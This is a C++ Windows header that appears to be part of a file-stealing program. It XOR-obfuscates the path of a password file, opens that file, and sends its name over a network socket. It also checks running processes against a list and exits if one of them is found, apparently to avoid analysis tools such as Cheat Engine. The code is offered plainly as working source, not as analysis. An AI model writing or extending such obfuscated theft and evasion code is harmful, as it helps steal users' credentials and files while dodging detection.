#pragma once
#include <iostream>
#include <string>
#include <Windows.h>
#include <TlHelp32.h>
#include <psapi.h>
#include "string.h"

using namespace std;
FILE* file_to_send;
HANDLE hProc = NULL;
DWORD pID;

string xorEncrypt(const string& input, const string& key) {
	string encrypted;
	for (size_t i = 0; i < input.length(); ++i) {
		encrypted += input[i] ^ key[i % key.length()];
	}
	return encrypted;
}

void SendFileName(SOCKET hSocket) {
	string FileName = "rmaPBBF^CUEIE";
	string key = "1";
	string decryptedName = xorEncrypt(FileName, key);
	const char* cString = decryptedName.c_str();

	char cMsg[1024];
	int iResult;
	strcpy(cMsg, cString);
	iResult = send(hSocket, cMsg, strlen(cMsg), 0);
}

void BufferRead() {
	string Name = "rmaPBBF^CUEIE"; //C:\\Password.txt
	string key = "1";
	string decrypted = xorEncrypt(Name, key);
	const char* cString = decrypted.c_str();
	file_to_send = fopen(cString, "rb");
	if (file_to_send == NULL) {
		//cout << "file open failed";
		exit(EXIT_FAILURE);
	}
}

bool SnapShotProcess(const char* targetProcessName){

	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnap, &pe32)) {
		do {
			if (strcmp(pe32.szExeFile, targetProcessName) == 0) {
				exit(EXIT_FAILURE);
				break;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	//printf("Process None\n");
	CloseHandle(hProcessSnap);
	return 1;
}


//DWORD WINAPI AntiThread(LPVOID lpParam) 
void AntiThread() {
		//HWND h_wnd = FindWindow(NULL, "Cheat Engine 7.4");
		//if (NULL != h_wnd) {
		//	exit(EXIT_FAILURE);
		//}
	for (int i = 0; i < 5; i++) {
		SnapShotProcess(AntiString[i]);
	}
}
